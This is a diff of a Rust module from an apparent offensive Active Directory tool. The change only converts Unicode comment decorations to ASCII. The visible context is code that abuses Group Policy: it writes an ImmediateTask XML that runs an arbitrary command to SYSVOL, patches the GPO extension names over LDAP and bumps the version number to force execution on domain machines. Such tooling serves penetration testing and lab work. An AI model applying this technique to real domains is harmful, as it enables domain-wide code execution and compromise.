@@ -13,12 +13,12 @@ use crate::proto::smb::SmbSession;
 use chrono::Utc;
 use uuid::Uuid;
 
-// ── XML builder ──────────────────────────────────────────────────────────────
+// -- XML builder --------------------------------------------------------------
 
 /// Build a Windows ImmediateTask XML blob that runs `command` **once** right
-/// after the next GP refresh cycle (no logon required — machine policy).
-/// `task_name` — display name shown in Task Scheduler (e.g. `"Overthrone-<timestamp>"`)  
-/// `command`   — full command line, e.g. `r"cmd.exe /c whoami > C:\out.txt"`
+/// after the next GP refresh cycle (no logon required -- machine policy).
+/// `task_name` -- display name shown in Task Scheduler (e.g. `"Overthrone-<timestamp>"`)  
+/// `command`   -- full command line, e.g. `r"cmd.exe /c whoami > C:\out.txt"`
 /// The resulting XML should be written to:
 /// `SYSVOL\{domain}\Policies\{gpo-cn}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml`
 pub fn build_immediate_task_xml(task_name: &str, command: &str) -> String {
@@ -104,14 +104,14 @@ pub fn build_immediate_task_xml(task_name: &str, command: &str) -> String {
     )
 }
 
-// ── SYSVOL helpers ───────────────────────────────────────────────────────────
+// -- SYSVOL helpers -----------------------------------------------------------
 
 /// Write an ImmediateTask XML file to SYSVOL and return the written path.
-/// `smb`          — authenticated `SmbSession` connected to the DC  
-/// `domain_fqdn`  — e.g. `"sevenkingdoms.local"`  
-/// `gpo_cn`       — raw CN from `GpoInfo::cn`, e.g. `"{31B2F340-016D-11D2-945F-00C04FB984F9}"`  
-/// `xml`          — output of `build_immediate_task_xml`  
-/// `is_machine`   — `true` → Machine policy, `false` → User policy
+/// `smb`          -- authenticated `SmbSession` connected to the DC  
+/// `domain_fqdn`  -- e.g. `"sevenkingdoms.local"`  
+/// `gpo_cn`       -- raw CN from `GpoInfo::cn`, e.g. `"{31B2F340-016D-11D2-945F-00C04FB984F9}"`  
+/// `xml`          -- output of `build_immediate_task_xml`  
+/// `is_machine`   -- `true` -> Machine policy, `false` -> User policy
 pub async fn write_gpo_task(
     smb: &SmbSession,
     domain_fqdn: &str,
@@ -160,7 +160,7 @@ pub async fn cleanup_gpo_task(
     Ok(())
 }
 
-// ── GPO LDAP metadata update ────────────────────────────────────────────────
+// -- GPO LDAP metadata update ------------------------------------------------
 
 /// Group Policy Preferences CSE GUID blocks required for ScheduledTasks.
 /// Machine and User tiers share the same pair of blocks (sorted order):
@@ -171,11 +171,11 @@ const CSE_SCHED_TASKS_BLOCKS: &str = "[{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D0
 /// Update `gPCMachineExtensionNames` (or `gPCUserExtensionNames`) on a GPO
 /// to include the ScheduledTasks CSE GUIDs, then bump `versionNumber` to force
 /// Group Policy refresh on domain clients.
-/// `ldap`       — authenticated `LdapSession`  
-/// `gpo_dn`     — full DN of the GPO container, e.g.
+/// `ldap`       -- authenticated `LdapSession`  
+/// `gpo_dn`     -- full DN of the GPO container, e.g.
 ///               `"CN={GUID},CN=Policies,CN=System,DC=corp,DC=local"`  
-/// `is_machine` — `true` → patch `gPCMachineExtensionNames` (machine tier)  
-///               `false` → patch `gPCUserExtensionNames` (user tier)
+/// `is_machine` -- `true` -> patch `gPCMachineExtensionNames` (machine tier)  
+///               `false` -> patch `gPCUserExtensionNames` (user tier)
 pub async fn update_gpc_extension_names(
     ldap: &mut LdapSession,
     gpo_dn: &str,
@@ -187,7 +187,7 @@ pub async fn update_gpc_extension_names(
         "gPCUserExtensionNames"
     };
 
-    // ── 1. Read current values ────────────────────────────────────────────────
+    // -- 1. Read current values ------------------------------------------------
     let entries = ldap
         .custom_search_with_base(
             gpo_dn,
@@ -222,10 +222,10 @@ pub async fn update_gpc_extension_names(
         .and_then(|s| s.parse().ok())
         .unwrap_or(0);
 
-    // ── 2. Merge CSE blocks ───────────────────────────────────────────────────
+    // -- 2. Merge CSE blocks ---------------------------------------------------
     let new_ext = merge_cse_blocks(current_ext, CSE_SCHED_TASKS_BLOCKS);
 
-    // ── 3. Write extension names ──────────────────────────────────────────────
+    // -- 3. Write extension names ----------------------------------------------
     ldap.modify_replace(gpo_dn, ext_attr, new_ext.as_bytes())
         .await
         .map_err(|e| OverthroneError::Ldap {
@@ -233,7 +233,7 @@ pub async fn update_gpc_extension_names(
             reason: format!("Failed to update {ext_attr}: {e}"),
         })?;
 
-    // ── 4. Bump versionNumber ─────────────────────────────────────────────────
+    // -- 4. Bump versionNumber -------------------------------------------------
     // The 32-bit versionNumber splits into: high-16 = machine, low-16 = user.
     // Increment the appropriate half so domain clients detect the change.
     let new_version = if is_machine {
@@ -256,7 +256,7 @@ pub async fn update_gpc_extension_names(
     Ok(())
 }
 
-/// Merge CSE block strings — ensure every `[{GUID1}{GUID2}]` token from
+/// Merge CSE block strings -- ensure every `[{GUID1}{GUID2}]` token from
 /// `to_add` is present in `current`, returning a sorted merged string.
 fn merge_cse_blocks(current: &str, to_add: &str) -> String {
     fn parse_blocks(s: &str) -> Vec<String> {
@@ -283,9 +283,9 @@ fn merge_cse_blocks(current: &str, to_add: &str) -> String {
     blocks.concat()
 }
 
-// ── Private utilities ────────────────────────────────────────────────────────
+// -- Private utilities --------------------------------------------------------
 
-/// Split `"cmd.exe /c whoami"` → `("cmd.exe", "/c whoami")`.
+/// Split `"cmd.exe /c whoami"` -> `("cmd.exe", "/c whoami")`.
 /// If the first token is quoted (e.g. `r#""C:\foo bar\x.exe" /arg"#`),
 /// the quoted portion becomes the program, the rest are args.
 fn split_command(command: &str) -> (String, String) {
